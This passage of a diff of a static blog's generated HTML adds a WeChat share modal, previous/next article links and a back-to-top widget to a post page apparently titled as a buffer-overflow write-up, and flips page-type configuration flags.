+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://ootyoo.github.io/2020/11/21/buffer-overflow-writeup/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="../../25/vpn/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          vpn
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="../../../05/27/RE-writeup-0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RE-writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -217,8 +452,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
